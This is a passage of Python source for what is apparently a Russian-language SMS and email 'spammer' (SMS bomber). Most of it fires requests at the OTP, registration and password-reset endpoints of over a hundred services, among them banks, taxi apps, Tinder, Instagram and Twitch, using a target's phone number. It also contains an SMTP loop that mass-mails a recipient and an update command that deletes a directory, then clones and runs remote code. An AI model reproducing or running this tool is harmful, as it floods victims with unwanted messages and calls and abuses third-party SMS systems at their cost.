        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://msk.tele2.ru/api/validation/number/" +phone, json={"sender": "Tele2"})
    except:
        pass
    try:
        requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data={"phoneNumber": phone, "countryCode": "ID", "name": "test", "email": "mail@mail.com", "deviceToken": "*"}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"})
    except:
        pass
    try:
        requests.post("https://belkacar.ru/get-confirmation-code", data={"phone": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://www.rabota.ru/remind", data={"credential": phone})
    except:
        pass
    try:
        requests.post("https://rutube.ru/api/accounts/sendpass/phone", data={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php", data={"name": _name, "phone": phone, "promo": "yellowforma"})
    except:
        pass
    try:
        requests.get("https://www.oyorooms.com/api/pwa/generateotp?phone="+phone9+"&country_code=%2B7&nod=4&locale=en")
    except:
        pass
    try:
        requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode", params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": phone, "recaptcha": "off", "g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.post("https://newnext.ru/graphql", json={"operationName": "registration", "variables": {"client": {"firstName": "Иван", "lastName": "Иванов", "phone": phone, "typeKeys": ["Unemployed"]}}, "query": "mutation registration($client: ClientInput!) {""\n  registration(client: $client) {""\n    token\n    __typename\n  }\n}\n"})
    except:
        pass
    try:
        requests.post("https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/", json={"client_type": "personal", "email": _email, "mobilephone": phone, "deliveryOption": "sms"})
    except:
        pass
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
    except:
        pass
    try:
        requests.post("https://online.sbis.ru/reg/service/", json={"jsonrpc":"2.0", "protocol":"5", "method":"Пользователь.ЗаявкаНаФизика", "params":{"phone":phone}, "id":"1"})
    except:
        pass
    try:
        requests.post("https://ib.psbank.ru/api/authentication/extendedClientAuthRequest", json={"firstName":"Иван", "middleName":"Иванович", "lastName":"Иванов", "sex":"1", "birthDate":"10.10.2000", "mobilePhone": phone9, "russianFederationResident":"true", "isDSA":"false", "personalDataProcessingAgreement":"true", "bKIRequestAgreement":"null", "promotionAgreement":"true"})
    except:
        pass
    try:
        requests.post("https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
    except:
        pass
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + phone, "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
    except:
        pass
    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": phone})
    except:
        pass
    try:
        requests.post("https://www.stoloto.ru/send-mobile-app-link", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms", data={"msisdn": phone}, headers={"App-ID": "cabinet"})
    except:
        pass
    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": phone, "type": 2})
    except:
        pass
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.delivery-club.ru/ajax/user_otp", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://alfalife.cc/auth.php", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app.benzuber.ru/login", data={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://app.cloudloyalty.ru/demo/send-code", json={"country": 2, "phone": phone, "roistatVisit": "47637", "experiments": {"new_header_title": "1"}})
    except:
        pass
    try:
        requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
    except:
        pass
    try:
        requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.ollis.ru/gql", json={"query": "mutation { phone(number:'%s', locale:ru) { token error { code message } } }"% phone})
    except:
        pass
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode", headers={"token": "."}, data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms", json={"userPhone": "+" + phone}, headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"})
    except:
        pass
    try:
        requests.post("https://shopandshow.ru/sms/password-request/", data={"phone": "+" +phone, "resend": 0})
    except:
        pass
    try:
        requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": "+" +phone})
    except:
        pass
    try:
        requests.get("https://www.sportmaster.ru/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
    except:
        pass
    try:
        requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +phone})
    except:
        pass
    try:
        requests.post('https://api.fex.net/api/v1/auth/scaffold', data={"phone": phone})
    except:
        pass
    try:
        requests.post('https://api.ennergiia.com/auth/api/development/lor', data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://pizzahut.ru/account/password-reset", data={"reset_by":"phone", "action_id":"pass-recovery", "phone": phone, "_token":"*"})
    except:
        pass
    try:
        requests.post("https://plink.tech/register/", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", data={"telephone": "8" + phone9})
    except:
        pass
    try:
        requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": phoneGorzdrav})
    except:
        pass
    try:
        requests.post("https://apteka366.ru/login/register/sms/send", data={"phone": phoneGorzdrav})
    except:
        pass
    try:
        requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": phone})
    except:
        pass
    try:
        requests.get("https://suandshi.ru/mobile_api/register_mobile_user", params={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
    except:
        pass
    try:
        requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29", data={"caller_number": phone})
    except:
        pass
    try:
        requests.post("https://mousam.ru/api/checkphone", data={"phone": phone, "target": "android app v0.0.2"})
    except:
        pass
    try:
        requests.post("https://ggbet.ru/api/auth/register-with-phone", data={"phone": "+" + phone, "login": email, "password": password, "agreement": "on", "oferta": "on"})
    except:
        pass
    try:
        requests.post("https://ng-api.webbankir.com/user/v2/create", json={"lastName": name, "firstName": name, "middleName": name, "mobilePhone": phone, "email": email,"smsCode": ""})
    except:
        pass
    try:
        requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"})
    except:
        pass
    try:
        requests.post("https://bamper.by/registration/?step=1", data={"phone": "+" + phone, "submit": "Запросить смс подтверждения", "rules": "on"})
    except:
        pass
    try:
        requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register", params={"phoneNumber": "+" + phone}, headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
    except:
        pass
    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/", json={"phone": "+" + phone, "type": "authenticateCode"})
    except:
        pass
    try:
        requests.post("https://clients.cleversite.ru/callback/run.php", data={"siteid": "62731", "num": phone, "title": "Онлайн-консультант", "referrer": "https://m.cleversite.ru/call"})
    except:
        pass
    try:
        requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.etm.ru/cat/runprog.html", data={"mphone": phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes"})
    except:
        pass
    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate", headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"}, data={"loginId": "+" + phone})
    except:
        pass
    try:
        requests.get("https://foodband.ru/api/", params={"call": "customers/sendVerificationCode", "phone": phone, "g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php", data={"casePar": "authSendsms", "MobilePhone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://www.hatimaki.ru/register/", data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONALphone]": phone, "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "", "register_submit_button": "Зарегистрироваться"})
    except:
        pass
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login", json={"phone": phone, "platform": "PISWeb"})
    except:
        pass
    try:
        requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
    except:
        pass
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "RU"})
    except:
        pass
    try:
        requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/", data={"country": "RU", "csrfmiddlewaretoken": "", "phone": phone})
    except:
        pass
    try:
        requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone})
    except:
        pass
    try:
        requests.post("https://koronapay.com/transfers/online/api/users/otps", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle", json={"url": "/api/client/phone_verification", "method": "POST", "data": {"client_id": 5646981, "phone": phone, "alisa_id": 1}, "headers": {"Client-Id": 5646981, "Content-Type": "application/x-www-form-urlencoded"}})
    except:
        pass
    try:
        requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": phone}, headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
    except:
        pass
    try:
        requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php", data={"data": phone, "metod": "postreg"})
    except:
        pass
    try:
        requests.get("https://menza-cafe.ru/system/call_me.php", params={"fio": name, "phone": phone, "phone_number": "1"})
    except:
        pass
    try:
        requests.post("https://www.niyama.ru/ajax/sendSMS.php", data={"REGISTER[PERSONALphone]": phone, "code": "", "sendsms": "Выслать код"})
    except:
        pass
    try:
        requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={"telephone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login", data={"data": json.dumps({"login": phone})})
    except:
        pass
    try:
        requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://sushifuji.ru/sms_send_ajax.php", data={"name": "false", "phone": phone})
    except:
        pass
    try:
        requests.post("https://tabasko.su/", data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH", "ACTION": "GET_CODE", "LOGIN": phone})
    except:
        pass
    try:
        requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", data={"action": "callbackphonenumber", "phone": phone})
    except:
        pass
    try:
        requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/", data={"RECALL": "Y", "BACK_CALLphone": phone})
    except:
        pass
    try:
        requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start", json={"phone": "+" + phone, "first_name": "-", "utm_data": {}, "via": "call"})
    except:
        pass
    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start", json={"phone": "+" + phone, "first_name": "-", "utm_data": {}, "via": "sms"})
    except:
        pass
    try:
        requests.post("https://b.utair.ru/api/v1/login/", data={"login": "+" + phone})
    except:
        pass
    try:
        requests.get("https://vezitaxi.com/api/employment/getsmscode", params={"phone": "+" + phone, "city": 561, "callback": "jsonp_callback_35979"})
    except:
        pass
    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
    except:
        pass
    try:
        requests.post("https://passport.twitch.tv/register?trusted_request=true", json={"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": password, "phone_number": phone, "username": username})
    except:
        pass
    try:
        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data={"email_or_username": phone, "recaptcha_challenge_field":""})
    except:
        pass
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": phone}, headers={})
    except:
        pass
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ua", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    except:
        pass
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"})
    except:
        pass
    try:
        requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0})
    except:
        pass
    try:
        requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
    except:
        pass
    try:
        requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
    except:
        pass
    try:
        requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
    except:
        pass
    try:
        requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone})
    except:
        pass
    try:
        requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify", json={"phone_number": phone, "region_code": "UA"})
    except:
        pass
    try:
        requests.post('https://auth.multiplex.ua/login', json={"login": phone})
    except:
        pass
    try:
        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": phone, "password": _name})
    except:
        pass
    try:
        requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': phone})                
    except:
        pass
    try:
        requests.post('https://www.yaposhka.kh.ua/customer/account/createpost/', data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": phone})
    except:
        pass
    try:
        requests.post('https://www.uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
    except:
        pass
    try:
        requests.post('https://partner.uklon.com.ua/api/v1/registration/sendcode', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
    except:
                    pass
    try:
        requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
    except:
        pass
    try:
        requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html', data={"phone": phone, "do": "phone"})
    except:
        pass
    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
    except:
        pass
    try:
        requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
    except:
        pass
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone})
    except:
        pass
    try:
        requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
    except:
        pass
    try:
        requests.post('https://mobileplanet.ua/register', data={"klient_name": name,"klientphone": "+" + phone,"klient_email": email})
    except:
        pass
    try:
        requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
    except:
        pass
    try:
        requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post('https://www.moyo.ua/identity/registration', data={"firstname": name,"phone": phone,"email": email})
    except:
        pass
    try:
        requests.post('https://secure.online.ua/ajax/checkphone/', params={"regphone": phone})
    except:
        pass
    try:
        requests.post('https://mamamia.ua/api/auth/login', data={"phone": phone}) 
    except:
        pass
    try:
        requests.post('https://sushiwok.ua/user/phone/validate', data={"phone": "+" +phone ,"captchaRegisterAnswer":false,"repeatCaptcha":false})
    except:
        pass
    try:
        requests.post('https://silpo.ua/graphql', data={"validateLoginInput":{"flowId":99322,"currentPlace":"phone","nextStep":"auth-otp","__typename":"FlowResponse"}})
    except:
        pass
    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + phone})
    except:
        pass
    try:
        requests.post('https://kasta.ua/api/v2/login/', data={"phone":phone})
    except:
        pass
    try:
        requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": phone})
    except:
        pass
    try:
        requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": phone})
    except:
        pass
    for value in range( int( N ) ):
      msg = MIMEMultipart()
      msg[ 'Subject' ] = T
      msg[ 'From' ] = L
      body = M
      msg.attach( MIMEText( body, 'plain' ) )
      server = root.SMTP_SSL( U, 465 )
      server.login( L, P )
      server.sendmail( L, To, msg.as_string() )
    server.quit()
    value += 1
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('Спамер завершён! Для выхода в главное меню напишите - "Выход"')
    choose3 = input ('>>>')
    if choose3 == 'Выход':
      exit
    else:
      print ('[1] Ошибка! Повтори запрос!')
def main():
  os.system('cls' if os.name=='nt' else 'clear')
  print (Fore.GREEN + logo)
  try:
     requests.get("http://google.com", verify=True)
  except:
      os.system('cls' if os.name=='nt' else 'clear')
      print (logo)
      conection()
  print ('[1] - ОТКРЫТЬ СПАМЕР\n[2] - ОБНОВИТЬ СПАМЕР')
  choose = input ('>>>')
  if choose == '1':
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[1] - ТОЛЬКО СПАМ СМС, [2] - ТОЛЬКО СПАМ ПОЧТЫ, [3] - СПАМ ПОЧТЫ И СМС')
    choose2 = input ('>>>')
    if choose2 == '1':
      sms()
    if choose2 == '2':
      mail()
    if choose2 == '3':
      smsandmail()
    else:
      os.system('cls' if os.name=='nt' else 'clear')
      print (logo)
      print ('[!] Ошибка! Повтори запрос!')
  if choose == '2':
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Происходит установка...')
    if os.name == 'nt':
      os.system('cls' if os.name=='nt' else 'clear')
      print (logo)
      print ('Операционная система Windows не обслуживается!!')
      main()
    else:
      os.system('cls' if os.name=='nt' else 'clear')
      print (logo)
      os.system("cd && rm -rf ~/spammer-by-ARnoLD && git clone https://github.com/palkamilka/spammer-by-ARnoLD && cd spammer-by-ARnoLD && python install.py && python spammer.py")
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
def conection():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('[!] Нет интернет соединения')
  print ('Когда вы будите подключены к сети интернет - напишите - [ДА]')
  connect = input ('>>>')
  if connect == 'ДА' or 'Да' or 'да':
    main()
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
import colorama, os
import requests, random, time, json
import smtplib as root
from colorama import Fore, Back
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
colorama.init()
logo = '''
╔═══╦═══╗     ╔╗  ╔═══╗
║╔═╗║╔═╗║     ║║  ╚╗╔╗║
║║ ║║╚═╝╠═╗╔══╣║   ║║║║
║╚═╝║╔╗╔╣╔╗╣╔╗║║ ╔╗║║║║
║╔═╗║║║╚╣║║║╚╝║╚═╝╠╝╚╝║
╚╝ ╚╩╝╚═╩╝╚╩══╩═══╩═══╝'''
main()
